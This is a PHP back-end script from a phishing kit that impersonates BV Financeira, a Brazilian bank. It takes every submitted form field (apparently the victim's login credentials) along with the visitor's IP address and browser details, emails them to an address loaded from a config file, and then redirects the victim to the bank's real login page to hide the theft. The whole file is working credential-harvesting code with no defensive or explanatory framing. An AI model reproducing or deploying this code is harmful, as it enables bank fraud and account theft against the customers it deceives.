<?php
if(!empty($_POST)){
date_default_timezone_set('America/Los_Angeles');
$ip = $_SERVER['REMOTE_ADDR'];
$data = date('d/m/Y');
$hora = date('H:i');
$pc_name = gethostbyaddr($_SERVER['REMOTE_ADDR']);



$dadospost = "";
			foreach($_POST as $key => $value){
	
				$dadospost .= "
				<tr>
				<td align=\"right\">".$key.":</td>
				<td>&nbsp;</td>
				<td>".$value."</td>
				</tr>";						
		
		}

		include("config.php");


		$ip = $_SERVER["REMOTE_ADDR"];
		$hora = date("H:i:s");				
		$navegador = $_SERVER['HTTP_USER_AGENT'];
		$assunto = "BVFINAN - $ip";
		$mensagem = stripslashes("
			<style type=\"text/css\">
			table tr td{padding:4px;}
			</style>
			</p>
			<table width=\"586\" border=\"0\" cellpadding=\"3\" style=\"font-family:Arial, 'lucida grande',tahoma,verdana,arial,sans-serif; border-spacing: 4px;font-size:14px; color:#333;\">
			<tr>
			<th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:16px;\">Dados da Info:</th>
			</tr>

			<tr>
			<td align=\"right\">NAVEGADOR:</td>
			<td>&nbsp;</td>
			<td>".$navegador."</td>
			</tr>
			".$dadospost."
			</table>
			</span>");

		$subject = $assunto;
		$bcc = "BV =?utf-8?Q?=F0=9F=92=B0?= FINANCEIRA";
		$message = $mensagem;
$headers ="";
		$headers .= 'To: '.$bcc.' <'.$email.'>' . "\r\n";
		$headers .= 'From: '.$bcc.' <contact@'.$_SERVER['SERVER_NAME'].'>' . "\r\n";
		$headers .= "MIME-Version: 1.0\r\n";
		$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
		@mail( $email, $subject, $message, $headers ); 	
		
		echo '<script type="text/javascript">window.location.href = "https://minha.bv.com.br/v2/login";</script>';
		
}else{
	echo '<script type="text/javascript">window.location.href = "v2_login.php";</script>';
}
		
?>